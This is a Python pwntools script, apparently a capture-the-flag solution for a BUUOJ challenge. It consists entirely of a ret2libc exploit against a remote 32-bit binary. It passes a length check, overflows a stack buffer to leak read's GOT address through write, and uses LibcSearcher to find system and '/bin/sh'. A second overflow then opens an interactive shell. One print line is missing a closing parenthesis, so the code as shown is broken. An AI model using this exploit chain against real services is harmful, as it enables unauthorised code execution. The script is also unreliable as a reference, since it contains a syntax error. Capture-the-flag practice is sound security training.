# -*- coding:utf-8 -*-
from pwn import *
from LibcSearcher import *

r=remote('node3.buuoj.cn',28548)
#r=process('./pwn')
elf=ELF('./pwn')
write_plt=elf.plt['write']
read_got=elf.got['read']
read_plt=elf.plt['read']
main_addr=0x8048825

payload1='\x00'+'\xff'*0x7
r.sendline(payload1)
r.recvuntil('Correct\n')

#泄露read的got地址
payload='a'*0xe7+'b'*0x4

payload+=p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)
r.sendline(payload)

read_addr=u32(r.recv(4))
print(hex(read_addr)

libc=LibcSearcher('read',read_addr)
libc_base=read_addr-libc.dump('read')
system_addr=libc_base+libc.dump('system')
bin_sh_addr=libc_base+libc.dump('str_bin_sh')

r.sendline(payload1)
r.recvuntil('Correct\n')

payload='a'*0xe7+'b'*0x4
payload+=p32(system_addr)+ p32(0xdeadbeef)+p32(bin_sh_addr)
r.sendline(payload)

r.interactive()